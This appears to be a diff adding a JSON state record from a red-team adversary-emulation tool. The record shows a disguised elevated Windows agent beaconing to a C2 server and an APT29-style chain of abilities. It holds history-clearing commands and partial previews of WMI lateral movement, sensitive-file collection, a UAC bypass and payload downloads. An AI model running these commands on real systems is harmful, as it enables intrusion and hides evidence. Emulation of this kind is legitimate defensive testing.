@@ -1,0 +1,248 @@
+{
+  "selected_agent": {
+    "paw": "fgdafj",
+    "sleep_min": 30,
+    "sleep_max": 60,
+    "watchdog": 0,
+    "group": "red",
+    "architecture": "amd64",
+    "platform": "windows",
+    "server": "http://192.168.30.45:8888",
+    "upstream_dest": "http://192.168.30.45:8888",
+    "username": "WS10\\Administrator",
+    "location": "C:\\Users\\Public\\splunkd.exe",
+    "pid": 6676,
+    "ppid": 8956,
+    "trusted": true,
+    "executors": [
+      "proc",
+      "cmd",
+      "psh"
+    ],
+    "privilege": "Elevated",
+    "exe_name": "splunkd.exe",
+    "host": "WS10",
+    "contact": "HTTP",
+    "proxy_receivers": {},
+    "proxy_chain": [],
+    "origin_link_id": "",
+    "deadman_enabled": true,
+    "available_contacts": [
+      "HTTP"
+    ],
+    "host_ip_addrs": [
+      "192.168.30.24"
+    ],
+    "display_name": "WS10$WS10\\Administrator",
+    "created": "2026-04-01T13:44:55Z",
+    "last_seen": "2026-04-02T07:53:19Z",
+    "links": [
+      {
+        "id": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+        "paw": "fgdafj",
+        "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "status": 0,
+        "score": 0,
+        "jitter": 0,
+        "decide": "2026-04-01T13:44:55Z",
+        "pin": 0,
+        "pid": "9040",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+        "collect": "2026-04-01T13:44:55Z",
+        "finish": "2026-04-01T13:44:55Z",
+        "ability": {
+          "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+          "tactic": "defense-evasion",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "technique_id": "T1070.003",
+          "name": "Avoid logs",
+          "description": "Stop terminal from logging history",
+          "executors": [
+            {
+              "name": "sh",
+              "platform": "darwin",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "sh",
+              "platform": "linux",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Clear-History;Clear",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "stockpile",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Clear-History;Clear",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "False",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:44:56Z"
+      }
+    ],
+    "pending_contact": "HTTP",
+    "status": "alive"
+  },
+  "selected_adversary": {
+    "adversary_id": "a8b7ce23-421b-44da-9e1d-489c6e2e9234",
+    "name": "APT29 Auto Profile Windows",
+    "description": "Adversary profile generato automaticamente da MITRE ATT&CK per APT29 su piattaforma Windows.",
+    "atomic_ordering": [
+      "ece5dde3-d370-4c20-b213-a1f424aa8d03",
+      "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+      "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "60f63260-39bb-4136-87a0-b6c2dca799fc"
+    ],
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [],
+    "has_repeatable_abilities": false,
+    "plugin": ""
+  },
+  "operation_adversary": {
+    "adversary_id": "temp-seed-fgdafj-1775116414",
+    "name": "Temp Seed Windows - APT29 Auto Profile Windows",
+    "description": "Auto-generated seed adversary from a8b7ce23-421b-44da-9e1d-489c6e2e9234 for agent fgdafj",
+    "atomic_ordering": [
+      "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "ece5dde3-d370-4c20-b213-a1f424aa8d03",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+      "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "60f63260-39bb-4136-87a0-b6c2dca799fc"
+    ]
+  },
+  "temp_adversary_info": {
+    "saved": true,
+    "adversary": {
+      "adversary_id": "temp-seed-fgdafj-1775116414",
+      "name": "Temp Seed Windows - APT29 Auto Profile Windows",
+      "description": "Auto-generated seed adversary from a8b7ce23-421b-44da-9e1d-489c6e2e9234 for agent fgdafj",
+      "atomic_ordering": [
+        "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+        "ece5dde3-d370-4c20-b213-a1f424aa8d03",
+        "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+        "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+        "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+        "60f63260-39bb-4136-87a0-b6c2dca799fc"
+      ]
+    },
+    "selected_abilities": [
+      {
+        "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+        "name": "Deadman - Delete agent file",
+        "tactic": "defense-evasion",
+        "technique_id": "T1070.004",
+        "noisy_score": 3,
+        "command_preview": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup; $startupInfo = New-CimInstance -CimCl…"
+      },
+      {
+        "ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03",
+        "name": "Start 54ndc47 (WMI)",
+        "tactic": "execution",
+        "technique_id": "T1047",
+        "noisy_score": 2,
+        "command_preview": "$node = '''#{remote.host.fqdn}'''; $user = '''#{domain.user.name}'''; $password = '''#{domain.user.…"
+      },
+      {
+        "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+        "name": "Find files",
+        "tactic": "collection",
+        "technique_id": "T1005",
+        "noisy_score": 1,
+        "command_preview": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContin…"
+      },
+      {
+        "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+        "name": "Bypass UAC Medium",
+        "tactic": "privilege-escalation",
+        "technique_id": "T1548.002",
+        "noisy_score": 0,
+        "command_preview": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"wi…"
+      },
+      {
+        "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+        "name": "Emulate Administrator Tasks",
+        "tactic": "execution",
+        "technique_id": "T1059.001",
+        "noisy_score": 0,
+        "command_preview": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrat…"
+      },
+      {
+        "ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc",
+        "name": "Install PowerShell Core 6",
+        "tactic": "command-and-control",
+        "technique_id": "T1105",
+        "noisy_score": 0,
+        "command_preview": "$wc=New-Object System.Net.WebClient; $output=\"PowerShellCore.msi\"; $wc.DownloadFile(\"https://github…"
+      }
+    ]
+  }
+}
